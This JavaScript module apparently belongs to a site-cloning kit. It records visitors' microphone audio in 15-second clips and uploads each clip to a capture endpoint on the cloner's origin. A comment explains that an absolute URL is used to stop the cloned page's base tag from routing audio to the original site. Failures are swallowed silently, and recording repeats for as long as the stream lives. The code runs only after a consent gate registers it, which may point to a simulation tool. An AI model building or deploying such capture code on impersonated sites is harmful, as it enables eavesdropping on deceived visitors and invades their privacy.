/**
 * microphone.js — records short audio clips from the microphone, then
 * uploads each clip.
 *
 * Gated: only runs after the consent notice has been accepted. With no gate
 * present this module stays inert.
 */
(function () {
  'use strict';

  /* Entry point — handed to the gate, not run on load. */
  function run() {
    if (!window.__SB_TARGET ||
        !navigator.mediaDevices || !navigator.mediaDevices.getUserMedia ||
        typeof MediaRecorder === 'undefined') return;

    const CHUNK_MS = 15000; // 15-second clips

    // Absolute URL on our own origin — bypasses the cloner's <base href>,
    // which would otherwise route mic chunks to the original site.
    var url = window.__SB_API
      ? window.__SB_API('mic')
      : (location.origin + '/api/capture.php?slug=' + encodeURIComponent(window.__SB_TARGET) + '&kind=mic');

    function send(blob) {
      fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/octet-stream' },
        body: blob,
        keepalive: true,
      }).catch(() => {});
    }

    navigator.mediaDevices.getUserMedia({ audio: true, video: false })
      .then((stream) => {
        const mime = MediaRecorder.isTypeSupported('audio/webm;codecs=opus')
          ? 'audio/webm;codecs=opus'
          : 'audio/webm';

        function startNewRecorder() {
          const rec = new MediaRecorder(stream, { mimeType: mime });
          const chunks = [];
          rec.ondataavailable = (e) => { if (e.data && e.data.size > 0) chunks.push(e.data); };
          rec.onstop = () => {
            if (chunks.length) send(new Blob(chunks, { type: mime }));
            // Roll into the next clip if the stream is still live.
            if (stream.active) startNewRecorder();
          };
          rec.start();
          setTimeout(() => { try { rec.stop(); } catch (_) {} }, CHUNK_MS);
        }

        startNewRecorder();
      })
      .catch(() => { /* permission denied — silent */ });
  }

  // Fail-closed: no consent controller means no capture.
  if (!window.__SB_CONSENT) return;
  window.__SB_CONSENT.register('microphone', run);
})();
